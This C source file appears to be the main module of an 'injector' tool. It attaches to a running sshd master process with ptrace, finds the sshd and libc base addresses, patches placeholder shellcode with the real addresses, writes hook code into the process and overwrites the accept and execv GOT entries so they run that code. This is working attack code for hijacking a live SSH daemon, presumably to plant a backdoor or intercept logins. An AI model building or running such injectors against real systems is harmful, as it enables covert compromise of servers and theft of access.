#include "func_offset.h"
#include "got_offset.h"
#include "inject_start.h"
#include "proc_map.h"
#include "seg_gap.h"
#include "sshd_accept_hook.h"
#include "sshd_execv_hook.h"
#include "trace_utils.h"
// clang-format off
#include <iso646.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

uint64_t sshd_base;
uint64_t libc_base;
uint64_t ld_base;

char *sshd_path = "/usr/bin/sshd";
char *libc_path = "/usr/lib/libc.so.6";

#define CALL_EXECV "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
#define GET_RW "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"

void
usage ()
{
  puts ("usage: injector sshd-master-pid [ sshd-path libc_path ]");
  puts ("use /proc/sshd-master-pid/maps paths");
  printf ("sshd_path default as %s\n", sshd_path);
  printf ("libc_path default as %s\n", libc_path);
  exit (0);
}

// replace the place_holder to the bytes I need
void
preprocess_code ()
{
  char *call_execv = CALL_EXECV;

  uint64_t execv = get_func_offset ("execv", libc_path);
  execv += libc_base;
  call_execv = memmem (sshd_execv, sizeof (sshd_execv), call_execv, 0xc);
  memcpy (&call_execv[2], &execv, 8);

  char *get_rw = GET_RW;
  uint64_t sshd_rw_start = sshd_base + get_seg_gap (sshd_path, 6);
  printf ("[INFO]: sshd_rw_start: 0x%lx\n", sshd_rw_start);

  get_rw = memmem (sshd_accept, sizeof (sshd_accept), get_rw, 0xa);
  memcpy (&get_rw[2], &sshd_rw_start, 0x8);

  get_rw = GET_RW;
  get_rw = memmem (sshd_execv, sizeof (sshd_execv), get_rw, 0xa);
  memcpy (&get_rw[2], &sshd_rw_start, 0x8);
}

int
main (int argc, char **argv)
{
  setbuf (stdin, NULL);
  setbuf (stdout, NULL);
  setbuf (stderr, NULL);

  if (argc < 2)
    usage ();
  uint32_t pid = strtol (argv[1], NULL, 0);

  if (argc > 2)
    sshd_path = argv[2];
  if (argc > 3)
    libc_path = argv[3];

  attach (pid);
  sshd_base = parse_maps (pid, "", sshd_path);
  libc_base = parse_maps (pid, "", libc_path);
  preprocess_code ();

  uint64_t accept_got = sshd_base + get_got_offset (sshd_path, "accept");
  printf ("[INFO]: accept_got at: 0x%lx\n", accept_got);
  uint64_t execv_got = sshd_base + get_got_offset (sshd_path, "execv");
  printf ("[INFO]: execv_got at: 0x%lx\n", execv_got);

  uint64_t code_start
      = inject_start (pid, sizeof (sshd_accept) + sizeof (sshd_execv));

  uint64_t accept_hook_start = code_start;
  copy_to_tracee (pid, accept_hook_start, sshd_accept, sizeof (sshd_accept));
  accept_hook_start += ACCEPT_HOOK_OFFSET;
  copy_to_tracee (pid, accept_got, (uint8_t *)&accept_hook_start, 0x8);

  uint64_t execv_hook_start
      = ((code_start + sizeof (sshd_accept)) & ~0x7) + 0x8;
  copy_to_tracee (pid, execv_hook_start, sshd_execv, sizeof (sshd_execv));
  execv_hook_start += EXECV_HOOK_OFFSET;
  copy_to_tracee (pid, execv_got, (uint8_t *)&execv_hook_start, 0x8);

  detach (pid);
}
